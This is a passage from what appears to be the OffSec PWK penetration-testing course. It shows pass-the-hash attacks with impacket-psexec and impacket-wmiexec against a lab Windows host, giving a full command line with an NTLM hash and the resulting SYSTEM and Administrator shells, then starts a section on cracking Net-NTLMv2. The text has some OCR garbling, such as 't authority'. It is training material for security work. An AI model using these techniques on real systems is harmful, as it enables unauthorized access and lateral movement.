# OffSec

Penetration Testing with Kali Linux

# Windows IP Configuration

Ethernet adapter Ethernet0:

| Connection-specific DNS Suffix | : |
| Link-local IPv6 Address | : fe80::7992:61cd:da49:9046%4 |
| IPv4 Address | : 192.168.50.212 |
| Subnet Mask | : 255.255.255.0 |
| Default Gateway | : 192.168.50.254 |

```
C:\Windows\system32> whoami
t authority\system
C:\Windows\system32> exit
```

```
kali@kali:-$ 
```

List 299 - Using psexec to get an interactive shell

We successfully obtained an interactive shell on FILES02. Due to the nature of psexec.py, we'll always receive a shell as SYSTEM instead of the user we used to authenticate.

We can use one of the other scripts like impacket-wmiexec to obtain a shell as the user we used for authentication. On Kali, we would use impacket-wmiexec along with the arguments we used for impacket-psexec.

```
kali@kali:-$ impacket-wmiexec -hashes
00000000000000000000000000000000:17a38310ea66f0027ee955abed1762964b
Administrator@192.168.50.212
```

Impacket v0.94 - Copyright 2021 SecureAuth Corporation

+   [*] SMB3.18 dialect used
[1] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

```
C:\whoami
files02>administrator
```

```
C:\>
```

List 299 - Using wmiexec to get an interactive shell

The whoami output shows, we obtained a shell as the Administrator user using wmiexec instead of SYSTEM.

In this section, we used pass-hash to gain access to an SMB share. We then used the hash to obtain an interactive shell with impacket-psexec and impacket-wmiexec.

# 13.3.3 Cracking Net-NTLMv2

In some penetration tests, we may obtain code execution or a shell on a Windows system as an unprivileged user. This means we cannot use tools Mimikatz to extract passwords or NTLM hashes. In situations like these, we can abuse the Net-NTLMv2 network authentication protocol. This protocol is responsible for managing the authentication process for Windows clients and servers over network.

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

419